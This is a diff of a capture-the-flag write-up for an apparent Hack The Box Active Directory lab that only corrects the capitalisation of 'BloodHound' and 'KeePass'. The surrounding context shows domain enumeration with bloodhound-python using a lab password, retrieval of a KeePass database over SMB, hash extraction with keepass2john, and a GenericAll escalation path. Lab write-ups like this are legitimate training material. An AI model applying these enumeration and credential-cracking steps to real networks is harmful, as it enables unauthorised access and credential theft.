@@ -109,21 +109,21 @@ smb: \> ls
 NT_STATUS_ACCESS_DENIED listing \*
 ```
 
-Next, we will bring our attention to Bloodhound:
+Next, we will bring our attention to BloodHound:
 
-#### Running Bloodhound-python:
+#### Running bloodhound-python:
 
 ```
 bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c all --zip
 ```
 
-#### Starting Bloodhound:
+#### Starting BloodHound:
 
 ```
 bloodhound
 ```
 
-In Bloodhound, we perform an analysis of Group Delegated Object Control on the levi.james user, which reveals the following graph:
+In BloodHound, we perform an analysis of Group Delegated Object Control on the levi.james user, which reveals the following graph:
 
 <img src="images/01-hr-developers.png" width="500">
 
@@ -198,7 +198,7 @@ smb: \> get recovery.kdbx
 getting file \recovery.kdbx of size 2677 as recovery.kdbx (9.1 KiloBytes/sec) (average 9.1 KiloBytes/sec)
 ```
 
-Now we will attempt to extract the keepass hash from recovery.kdbx:
+Now we will attempt to extract the KeePass hash from recovery.kdbx:
 
 ```
 keepass2john recovery.kdbx
@@ -218,9 +218,9 @@ Unfortunately the john database is out of date. We will therefore need to update
 cd /opt && git clone https://github.com/openwall/john.git && cd john/src && ./configure && make -s clean && make -sj4
 ```
 
-Now we are able to extract the keepass hash from recovery.kdbx:
+Now we are able to extract the KeePass hash from recovery.kdbx:
 
-#### Extracting keepass hash:
+#### Extracting KeePass hash:
 
 ```
 /opt/john/run/./keepass2john /home/candidbandit/recovery.kdbx > kdbx_hash.txt
@@ -296,9 +296,9 @@ Success! We have found ant.edwards SMB password.
 
 ## ant.edwards -> adam.silver
 
-Looking again at Bloodhound, we can see that ant.edwards is a member of Senior Devs, and Senior Devs has GenericAll over adam.silver:
+Looking again at BloodHound, we can see that ant.edwards is a member of Senior Devs, and Senior Devs has GenericAll over adam.silver:
 
-#### Bloodhound:
+#### BloodHound:
 
 <img src="images/03-ant-adam.png" width="500">
 
